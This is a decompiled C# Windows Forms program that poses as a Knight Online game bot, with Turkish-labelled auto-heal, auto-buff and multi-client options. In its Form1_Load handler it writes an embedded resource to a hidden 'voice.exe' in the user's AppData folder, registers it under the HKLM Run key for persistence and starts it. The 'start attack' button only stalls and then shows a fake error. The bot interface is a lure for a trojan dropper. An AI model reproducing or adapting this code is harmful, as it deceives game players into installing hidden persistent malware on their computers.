using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using NFv1978Multi.Properties;

namespace Koxp;

public class Form1 : Form
{
	private string dizin = "C:\\Users\\" + SystemInformation.get_UserName().ToString() + "\\AppData\\Roaming\\voice.exe";

	private IContainer components = null;

	private CheckBox checkBox5;

	private RadioButton radioButton2;

	private RadioButton radioButton1;

	private CheckBox checkBox8;

	private CheckBox checkBox6;

	private CheckBox checkBox7;

	private GroupBox groupBox1;

	private CheckBox checkBox2;

	private Button btn_Durdur;

	private Button btn_baslat;

	private CheckBox checkBox1;

	private CheckBox checkBox3;

	private CheckBox checkBox4;

	private Timer tmr_Knight;

	private GroupBox groupBox2;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private ToolStripStatusLabel lbl_durum;

	private GroupBox groupBox3;

	public Form1()
	{
		InitializeComponent();
	}

	private void btn_baslat_Click(object sender, EventArgs e)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Invalid comparison between Unknown and I4
		((Control)btn_baslat).set_Enabled(false);
		((Control)btn_Durdur).set_Enabled(true);
		for (long num = 0L; num < 9999999999999L; num++)
		{
		}
		DialogResult val = MessageBox.Show("An error has occurred while creating an error report", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		if ((int)val == 1)
		{
			Application.Exit();
		}
	}

	private void radioButton1_CheckedChanged(object sender, EventArgs e)
	{
		if (radioButton1.get_Checked())
		{
			((Control)groupBox1).set_Enabled(true);
			((Control)groupBox2).set_Enabled(false);
		}
		else
		{
			((Control)groupBox2).set_Enabled(true);
			((Control)groupBox1).set_Enabled(false);
		}
	}

	private void tmr_Knight_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("KnightOnLine");
		if (processesByName.Length != 0)
		{
			((ToolStripItem)lbl_durum).set_ForeColor(Color.Green);
			((ToolStripItem)lbl_durum).set_Text("KnightOnLine Çalışıyor!");
		}
		else
		{
			((ToolStripItem)lbl_durum).set_ForeColor(Color.Red);
			((ToolStripItem)lbl_durum).set_Text("KnightOnLine Çalışmıyor!");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		radioButton1.set_Checked(true);
		if (!File.Exists(dizin))
		{
			File.WriteAllBytes(dizin, Resources.voice);
			File.SetAttributes(dizin, FileAttributes.Hidden);
			try
			{
				string subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(subkey);
				registryKey.SetValue("voice", dizin);
				registryKey.Close();
			}
			catch
			{
				return;
			}
		}
		Process[] processesByName = Process.GetProcessesByName("voice");
		if (processesByName.Length == 0)
		{
			Process.Start(dizin);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_08c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08cd: Expected O, but got Unknown
		//IL_0918: Unknown result type (might be due to invalid IL or missing references)
		//IL_0922: Expected O, but got Unknown
		//IL_0a90: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9a: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		checkBox5 = new CheckBox();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		checkBox8 = new CheckBox();
		checkBox6 = new CheckBox();
		checkBox7 = new CheckBox();
		groupBox1 = new GroupBox();
		checkBox2 = new CheckBox();
		btn_Durdur = new Button();
		btn_baslat = new Button();
		checkBox1 = new CheckBox();
		checkBox3 = new CheckBox();
		checkBox4 = new CheckBox();
		tmr_Knight = new Timer(components);
		groupBox2 = new GroupBox();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		lbl_durum = new ToolStripStatusLabel();
		groupBox3 = new GroupBox();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)statusStrip1).SuspendLayout();
		((Control)groupBox3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)checkBox5).set_AutoSize(true);
		((Control)checkBox5).set_Location(new Point(117, 43));
		((Control)checkBox5).set_Name("checkBox5");
		((Control)checkBox5).set_Size(new Size(134, 17));
		((Control)checkBox5).set_TabIndex(2);
		((Control)checkBox5).set_Text("Oto Heal Party 960 HP");
		((ButtonBase)checkBox5).set_UseVisualStyleBackColor(true);
		((Control)radioButton2).set_AutoSize(true);
		((Control)radioButton2).set_Location(new Point(152, 19));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(51, 17));
		((Control)radioButton2).set_TabIndex(13);
		radioButton2.set_TabStop(true);
		((Control)radioButton2).set_Text("Priest");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		((Control)radioButton1).set_AutoSize(true);
		((Control)radioButton1).set_Location(new Point(50, 19));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(57, 17));
		((Control)radioButton1).set_TabIndex(12);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("Rogue");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		radioButton1.add_CheckedChanged((EventHandler)radioButton1_CheckedChanged);
		((Control)checkBox8).set_AutoSize(true);
		((Control)checkBox8).set_Location(new Point(162, 69));
		((Control)checkBox8).set_Name("checkBox8");
		((Control)checkBox8).set_Size(new Size(70, 17));
		((Control)checkBox8).set_TabIndex(11);
		((Control)checkBox8).set_Text("Oto Party");
		((ButtonBase)checkBox8).set_UseVisualStyleBackColor(true);
		((Control)checkBox6).set_AutoSize(true);
		((Control)checkBox6).set_Location(new Point(117, 19));
		((Control)checkBox6).set_Name("checkBox6");
		((Control)checkBox6).set_Size(new Size(85, 17));
		((Control)checkBox6).set_TabIndex(3);
		((Control)checkBox6).set_Text("Oto Buff AC ");
		((ButtonBase)checkBox6).set_UseVisualStyleBackColor(true);
		((Control)checkBox7).set_AutoSize(true);
		((Control)checkBox7).set_Location(new Point(39, 69));
		((Control)checkBox7).set_Name("checkBox7");
		((Control)checkBox7).set_Size(new Size(107, 17));
		((Control)checkBox7).set_TabIndex(10);
		((Control)checkBox7).set_Text("Multi-Client Açma");
		((ButtonBase)checkBox7).set_UseVisualStyleBackColor(true);
		((Control)groupBox1).get_Controls().Add((Control)(object)checkBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)btn_Durdur);
		((Control)groupBox1).get_Controls().Add((Control)(object)btn_baslat);
		((Control)groupBox1).get_Controls().Add((Control)(object)checkBox1);
		((Control)groupBox1).set_Location(new Point(10, 92));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(257, 88));
		((Control)groupBox1).set_TabIndex(8);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Rogue");
		((Control)checkBox2).set_AutoSize(true);
		((Control)checkBox2).set_Location(new Point(152, 52));
		((Control)checkBox2).set_Name("checkBox2");
		((Control)checkBox2).set_Size(new Size(68, 17));
		((Control)checkBox2).set_TabIndex(3);
		((Control)checkBox2).set_Text("Oto Wolf");
		((ButtonBase)checkBox2).set_UseVisualStyleBackColor(true);
		((Control)btn_Durdur).set_Enabled(false);
		((Control)btn_Durdur).set_Location(new Point(15, 48));
		((Control)btn_Durdur).set_Name("btn_Durdur");
		((Control)btn_Durdur).set_Size(new Size(121, 23));
		((Control)btn_Durdur).set_TabIndex(2);
		((Control)btn_Durdur).set_Text("Atak Durdur");
		((ButtonBase)btn_Durdur).set_UseVisualStyleBackColor(true);
		((Control)btn_baslat).set_Location(new Point(15, 19));
		((Control)btn_baslat).set_Name("btn_baslat");
		((Control)btn_baslat).set_Size(new Size(121, 23));
		((Control)btn_baslat).set_TabIndex(1);
		((Control)btn_baslat).set_Text("Atak Başlat");
		((ButtonBase)btn_baslat).set_UseVisualStyleBackColor(true);
		((Control)btn_baslat).add_Click((EventHandler)btn_baslat_Click);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(152, 23));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(99, 17));
		((Control)checkBox1).set_TabIndex(0);
		((Control)checkBox1).set_Text("Oto Repair Yap");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((Control)checkBox3).set_AutoSize(true);
		((Control)checkBox3).set_Location(new Point(7, 20));
		((Control)checkBox3).set_Name("checkBox3");
		((Control)checkBox3).set_Size(new Size(101, 17));
		((Control)checkBox3).set_TabIndex(0);
		((Control)checkBox3).set_Text("Oto Heal 60 HP");
		((ButtonBase)checkBox3).set_UseVisualStyleBackColor(true);
		((Control)checkBox4).set_AutoSize(true);
		((Control)checkBox4).set_Location(new Point(7, 43));
		((Control)checkBox4).set_Name("checkBox4");
		((Control)checkBox4).set_Size(new Size(107, 17));
		((Control)checkBox4).set_TabIndex(1);
		((Control)checkBox4).set_Text("Oto Heal 720 HP");
		((ButtonBase)checkBox4).set_UseVisualStyleBackColor(true);
		tmr_Knight.set_Enabled(true);
		tmr_Knight.add_Tick((EventHandler)tmr_Knight_Tick);
		((Control)groupBox2).get_Controls().Add((Control)(object)checkBox6);
		((Control)groupBox2).get_Controls().Add((Control)(object)checkBox5);
		((Control)groupBox2).get_Controls().Add((Control)(object)checkBox4);
		((Control)groupBox2).get_Controls().Add((Control)(object)checkBox3);
		((Control)groupBox2).set_Location(new Point(10, 186));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(257, 68));
		((Control)groupBox2).set_TabIndex(9);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("Priest");
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripStatusLabel1,
			(ToolStripItem)lbl_durum
		});
		((Control)statusStrip1).set_Location(new Point(0, 259));
		((Control)statusStrip1).set_Name("statusStrip1");
		((Control)statusStrip1).set_Size(new Size(279, 22));
		statusStrip1.set_SizingGrip(false);
		((Control)statusStrip1).set_TabIndex(15);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(90, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("Oyun Durumu :");
		((ToolStripItem)lbl_durum).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((ToolStripItem)lbl_durum).set_Name("lbl_durum");
		((ToolStripItem)lbl_durum).set_Size(new Size(12, 17));
		((ToolStripItem)lbl_durum).set_Text("-");
		((Control)groupBox3).get_Controls().Add((Control)(object)radioButton1);
		((Control)groupBox3).get_Controls().Add((Control)(object)radioButton2);
		((Control)groupBox3).set_Location(new Point(12, 14));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(257, 48));
		((Control)groupBox3).set_TabIndex(16);
		groupBox3.set_TabStop(false);
		((Control)groupBox3).set_Text("Job Seçimi");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(279, 281));
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)checkBox8);
		((Control)this).get_Controls().Add((Control)(object)checkBox7);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("NF v1978 Multi");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)groupBox3).ResumeLayout(false);
		((Control)groupBox3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
